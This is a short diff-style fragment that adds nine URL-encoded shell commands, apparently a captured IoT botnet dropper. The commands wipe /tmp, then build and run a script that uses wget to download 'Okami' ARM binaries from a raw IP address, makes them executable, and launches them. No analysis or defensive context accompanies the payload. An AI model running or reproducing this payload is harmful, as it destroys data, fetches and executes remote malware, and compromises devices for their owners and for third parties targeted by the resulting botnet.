@@ -1,0 +1,9 @@
+rm+-rf+/tmp/*
+echo+-e+"cd+/tmp"+>+/tmp/exploited
+echo+-e+"wget+http:/\/178.156.202.115/Okami.arm7"+>>+/tmp/exploited
+echo+-e+"wget+http:/\/178.156.202.115/Okami.arm"+>>+/tmp/exploited
+echo+-e+"chmod+777+/tmp/Okami.arm7"+>>+/tmp/exploited
+echo+-e+"chmod+777+/tmp/Okami.arm"+>>+/tmp/exploited
+echo+-e+"/tmp/Okami.arm7+exploit.arm7"+>>+/tmp/exploited
+echo+-e+"/tmp/Okami.arm+exploit.arm"+>>+/tmp/exploited
+sh+/tmp/exploited
